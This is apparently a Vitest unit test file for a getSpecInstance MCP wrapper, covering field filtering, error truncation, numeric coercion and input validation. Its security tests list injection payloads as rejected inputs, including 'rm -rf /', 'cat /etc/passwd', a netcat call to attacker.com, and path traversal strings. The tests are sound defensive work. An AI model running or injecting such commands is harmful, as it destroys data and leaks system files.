/**
 * Unit Tests for getSpecInstance Wrapper
 *
 * Tests with mocked MCP server.
 * Run with: npx vitest run get-spec-instance.unit.test.ts
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  createMCPMock,
  testSecurityScenarios,
  getAllSecurityScenarios,
  MCPErrors,
} from '@claude/testing';

// Mock the MCP client module BEFORE importing the wrapper
vi.mock('../config/lib/mcp-client', () => ({
  callMCPTool: vi.fn(),
}));

import { getSpecInstance } from './get-spec-instance';
import * as mcpClient from '../config/lib/mcp-client';

// Get the mocked function
const mcpMock = vi.mocked(mcpClient.callMCPTool);

describe('getSpecInstance - Unit Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Filtering logic', () => {
    it('should filter spec instance to essential fields only', async () => {
      // Arrange: Mock response with extra fields
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'login.spec.ts',
        status: 'passed',
        duration: 1500,
        tests: 10,
        passed: 10,
        failed: 0,
        // Extra fields that should be filtered out
        configuration: { browser: 'chrome' },
        metadata: { author: 'test' },
        fullLogs: 'very long log output...',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Only essential fields present
      expect(result.instance).toEqual({
        id: 'instance-123',
        spec: 'login.spec.ts',
        status: 'passed',
        duration: 1500,
        tests: 10,
        passed: 10,
        failed: 0,
        error: undefined,
      });
      expect(result.instance).not.toHaveProperty('configuration');
      expect(result.instance).not.toHaveProperty('metadata');
      expect(result.instance).not.toHaveProperty('fullLogs');
    });

    it('should truncate error messages to 300 characters', async () => {
      // Arrange: Long error message
      const longError = 'A'.repeat(500);
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'failing.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 5,
        passed: 3,
        failed: 2,
        error: longError,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Error truncated to 300 chars
      expect(result.instance.error).toBeDefined();
      expect(result.instance.error?.length).toBe(300);
      expect(result.instance.error).toBe('A'.repeat(300));
    });

    it('should handle null response', async () => {
      // Arrange
      mcpMock.mockResolvedValue(null);

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Defaults applied
      expect(result.instance).toEqual({
        id: 'instance-123',
        spec: 'unknown',
        status: 'unknown',
        duration: 0,
        tests: 0,
        passed: 0,
        failed: 0,
        error: undefined,
      });
    });

    it('should handle string numbers in response', async () => {
      // Arrange: MCP returns strings instead of numbers
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: '1500',
        tests: '10',
        passed: '8',
        failed: '2',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Coerced to numbers
      expect(result.instance.duration).toBe(1500);
      expect(result.instance.tests).toBe(10);
      expect(result.instance.passed).toBe(8);
      expect(result.instance.failed).toBe(2);
    });

    it('should handle missing optional fields with defaults', async () => {
      // Arrange: Instance with missing optional fields
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Defaults applied
      expect(result.instance.duration).toBe(0);
      expect(result.instance.tests).toBe(0);
      expect(result.instance.passed).toBe(0);
      expect(result.instance.failed).toBe(0);
      expect(result.instance.error).toBeUndefined();
    });

    it('should preserve error field when undefined', async () => {
      // Arrange: Instance without error
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Error is undefined (not an empty string)
      expect(result.instance.error).toBeUndefined();
    });
  });

  describe('Token estimation', () => {
    it('should calculate tokens based on JSON size', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1500,
        tests: 10,
        passed: 10,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: 4 chars per token
      const expectedTokens = Math.ceil(JSON.stringify(result.instance).length / 4);
      expect(result.estimatedTokens).toBe(expectedTokens);
      expect(result.estimatedTokens).toBeGreaterThan(0);
    });

    it('should include truncated error in token calculation', async () => {
      // Arrange: Instance with error
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 5,
        passed: 3,
        failed: 2,
        error: 'Error: Test failed\n  at line 10\n  at line 20',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Token count includes error
      expect(result.estimatedTokens).toBeGreaterThan(0);
      const expectedTokens = Math.ceil(JSON.stringify(result.instance).length / 4);
      expect(result.estimatedTokens).toBe(expectedTokens);
    });
  });

  describe('Response format handling', () => {
    it('should handle object format', async () => {
      // Arrange: Standard format
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert
      expect(result.instance).toBeDefined();
      expect(typeof result.instance).toBe('object');
    });

    it('should handle direct array format (forEach bug prevention)', async () => {
      // Arrange: Array format that would break forEach
      mcpMock.mockResolvedValue([
        {
          id: 'instance-123',
          spec: 'test.spec.ts',
          status: 'passed',
          duration: 1000,
          tests: 5,
          passed: 5,
          failed: 0,
        },
      ]);

      // Act & Assert: Should not crash when trying to access properties
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });
      expect(result.instance).toBeDefined();
      // Verify defaults applied when response is array (not expected format)
      expect(result.instance.id).toBe('instance-123');
      expect(result.instance.spec).toBe('unknown');
    });

    it('should handle tuple format (forEach bug prevention)', async () => {
      // Arrange: Tuple format [data, metadata]
      mcpMock.mockResolvedValue([
        {
          id: 'instance-123',
          spec: 'test.spec.ts',
          status: 'passed',
          duration: 1000,
          tests: 5,
          passed: 5,
          failed: 0,
        },
        { cursor: 'next-page' },
      ]);

      // Act & Assert: Should not crash when accessing tuple
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });
      expect(result.instance).toBeDefined();
      // Verify defaults applied when response is tuple (not expected format)
      expect(result.instance.id).toBe('instance-123');
      expect(result.instance.spec).toBe('unknown');
    });
  });

  describe('Error handling', () => {
    it('should handle MCP rate limit errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(new Error('Rate limit exceeded'));

      // Act & Assert
      await expect(getSpecInstance.execute({ instanceId: 'instance-123' })).rejects.toThrow(
        'Rate limit exceeded'
      );
    });

    it('should handle MCP timeout errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(new Error('Request timeout'));

      // Act & Assert
      await expect(getSpecInstance.execute({ instanceId: 'instance-123' })).rejects.toThrow(
        'Request timeout'
      );
    });

    it('should handle MCP server errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(new Error('Internal server error'));

      // Act & Assert
      await expect(getSpecInstance.execute({ instanceId: 'instance-123' })).rejects.toThrow(
        'Internal server error'
      );
    });
  });

  describe('Input validation', () => {
    it('should require instanceId', async () => {
      // Act & Assert
      await expect(getSpecInstance.execute({ instanceId: '' })).rejects.toThrow();
    });

    it('should accept valid instanceId', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'valid-id-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      await getSpecInstance.execute({ instanceId: 'valid-id-123' });

      // Assert: No errors thrown
      expect(mcpMock).toHaveBeenCalled();
    });
  });

  describe('Security validation', () => {
    it('should reject path traversal in instanceId', async () => {
      // Arrange
      const attacks = ['../../../etc/passwd', '..\\..\\..\\windows', 'inst/../admin'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getSpecInstance.execute({ instanceId: attack })).rejects.toThrow(
          /path traversal/i
        );
      }
    });

    it('should reject command injection in instanceId', async () => {
      // Arrange
      const attacks = ['inst; rm -rf /', 'inst && cat /etc/passwd', 'inst | nc attacker.com'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getSpecInstance.execute({ instanceId: attack })).rejects.toThrow(
          /command injection/i
        );
      }
    });

    it('should reject control characters in instanceId', async () => {
      // Arrange
      const attacks = ['inst\x00', 'inst\r\n', 'inst\x1b[31m'];

      // Act & Assert
      for (const attack of attacks) {
        await expect(getSpecInstance.execute({ instanceId: attack })).rejects.toThrow(
          /control characters/i
        );
      }
    });

    it('should accept safe instance IDs', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act & Assert
      await expect(getSpecInstance.execute({ instanceId: 'instance-123' })).resolves.toBeDefined();
      await expect(getSpecInstance.execute({ instanceId: 'instance_456' })).resolves.toBeDefined();
      await expect(getSpecInstance.execute({ instanceId: 'instance.789' })).resolves.toBeDefined();
    });
  });

  describe('Performance', () => {
    it('should have minimal wrapper overhead', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act: Measure execution time
      const start = performance.now();
      await getSpecInstance.execute({ instanceId: 'instance-123' });
      const end = performance.now();

      // Assert: Wrapper overhead should be minimal (<1ms excluding MCP call)
      const overhead = end - start;
      console.log(`Wrapper execution time: ${overhead.toFixed(2)}ms`);
      expect(overhead).toBeLessThan(100); // Very generous bound for testing
    });

    it('should handle error truncation efficiently', async () => {
      // Arrange: Very long error
      const veryLongError = 'E'.repeat(10000);
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 5,
        passed: 3,
        failed: 2,
        error: veryLongError,
      });

      // Act: Measure truncation time
      const start = performance.now();
      await getSpecInstance.execute({ instanceId: 'instance-123' });
      const end = performance.now();

      // Assert: Should complete quickly even with huge error
      const duration = end - start;
      console.log(`Error truncation time: ${duration.toFixed(0)}ms`);
      expect(duration).toBeLessThan(100);
    });
  });

  describe('Status variants', () => {
    it('should handle all known status values', async () => {
      // Arrange: All valid status values
      const validStatuses = ['passed', 'failed', 'pending', 'running', 'skipped'];

      for (const status of validStatuses) {
        mcpMock.mockResolvedValue({
          id: 'instance-123',
          spec: 'test.spec.ts',
          status,
          duration: 1000,
          tests: 5,
          passed: 5,
          failed: 0,
        });

        // Act
        const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

        // Assert
        expect(result.instance.status).toBe(status);
      }
    });

    it('should handle unknown status values as strings', async () => {
      // Arrange: Unknown status
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'custom-status',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Should accept unknown status
      expect(result.instance.status).toBe('custom-status');
      expect(typeof result.instance.status).toBe('string');
    });
  });

  describe('MCP call parameters', () => {
    it('should pass instanceId to MCP', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'test-instance',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      await getSpecInstance.execute({ instanceId: 'test-instance' });

      // Assert: MCP called with correct parameters
      expect(mcpMock).toHaveBeenCalledWith(
        'currents',
        'currents-get-spec-instance',
        expect.objectContaining({
          instanceId: 'test-instance',
        })
      );
    });
  });

  // ==========================================================================
  // Edge case handling
  // ==========================================================================

  describe('Edge case handling', () => {
    it('should handle null values in numeric fields gracefully', async () => {
      // Arrange: MCP returns null for numeric fields
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: null,
        tests: null,
        passed: null,
        failed: null,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Null numeric fields default to 0
      expect(result.instance.duration).toBe(0);
      expect(result.instance.tests).toBe(0);
      expect(result.instance.passed).toBe(0);
      expect(result.instance.failed).toBe(0);
    });

    it('should handle undefined values in fields gracefully', async () => {
      // Arrange: MCP returns partial response with undefined fields
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: undefined,
        status: undefined,
        duration: undefined,
        tests: undefined,
        passed: undefined,
        failed: undefined,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Undefined fields use defaults
      expect(result.instance.id).toBe('instance-123');
      expect(result.instance.spec).toBe('unknown');
      expect(result.instance.status).toBe('unknown');
      expect(result.instance.duration).toBe(0);
      expect(result.instance.tests).toBe(0);
    });

    it('should handle missing id by using instanceId from input', async () => {
      // Arrange: MCP returns response without id
      mcpMock.mockResolvedValue({
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 1000,
        tests: 5,
        passed: 5,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'fallback-id' });

      // Assert: Uses instanceId from input as fallback
      expect(result.instance.id).toBe('fallback-id');
    });

    it('should truncate very long error messages to 300 characters', async () => {
      // Arrange: Very long error message
      const veryLongError = 'A'.repeat(500);
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 1,
        passed: 0,
        failed: 1,
        error: veryLongError,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Error is truncated
      expect(result.instance.error).toHaveLength(300);
      expect(result.instance.error).toBe('A'.repeat(300));
    });

    it('should handle error being exactly 300 characters', async () => {
      // Arrange: Error exactly at boundary
      const exactError = 'B'.repeat(300);
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 1,
        passed: 0,
        failed: 1,
        error: exactError,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Error is preserved at boundary
      expect(result.instance.error).toHaveLength(300);
    });

    it('should handle zero duration', async () => {
      // Arrange: Zero duration (instant test)
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: 0,
        tests: 1,
        passed: 1,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Zero duration is valid
      expect(result.instance.duration).toBe(0);
    });

    it('should handle NaN values in numeric fields', async () => {
      // Arrange: NaN values
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: NaN,
        tests: NaN,
        passed: NaN,
        failed: NaN,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: NaN converted to 0 via Number() || 0 pattern
      expect(result.instance.duration).toBe(0);
      expect(result.instance.tests).toBe(0);
      expect(result.instance.passed).toBe(0);
      expect(result.instance.failed).toBe(0);
    });

    it('should handle negative values in numeric fields', async () => {
      // Arrange: Negative values (edge case, should preserve)
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: -100,
        tests: -1,
        passed: -2,
        failed: -3,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Negative values are preserved (Number() doesn't filter negatives)
      expect(result.instance.duration).toBe(-100);
      expect(result.instance.tests).toBe(-1);
      expect(result.instance.passed).toBe(-2);
      expect(result.instance.failed).toBe(-3);
    });

    it('should handle very long spec names', async () => {
      // Arrange: Very long spec name
      const longSpecName = 'path/to/very/deeply/nested/' + 'directory/'.repeat(20) + 'test.spec.ts';
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: longSpecName,
        status: 'passed',
        duration: 1000,
        tests: 1,
        passed: 1,
        failed: 0,
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Long spec names are preserved (no truncation for spec)
      expect(result.instance.spec).toBe(longSpecName);
    });

    it('should handle string values in numeric fields', async () => {
      // Arrange: String values that can be coerced to numbers
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'passed',
        duration: '5000',
        tests: '10',
        passed: '8',
        failed: '2',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: String values coerced to numbers
      expect(result.instance.duration).toBe(5000);
      expect(result.instance.tests).toBe(10);
      expect(result.instance.passed).toBe(8);
      expect(result.instance.failed).toBe(2);
    });

    it('should handle empty string error', async () => {
      // Arrange: Empty string error (truthy check)
      mcpMock.mockResolvedValue({
        id: 'instance-123',
        spec: 'test.spec.ts',
        status: 'failed',
        duration: 1000,
        tests: 1,
        passed: 0,
        failed: 1,
        error: '',
      });

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'instance-123' });

      // Assert: Empty string is falsy, so error becomes undefined
      expect(result.instance.error).toBeUndefined();
    });

    it('should handle null MCP response', async () => {
      // Arrange: MCP returns null
      mcpMock.mockResolvedValue(null);

      // Act
      const result = await getSpecInstance.execute({ instanceId: 'fallback-id' });

      // Assert: Defaults used throughout
      expect(result.instance.id).toBe('fallback-id');
      expect(result.instance.spec).toBe('unknown');
      expect(result.instance.status).toBe('unknown');
      expect(result.instance.duration).toBe(0);
    });
  });
});
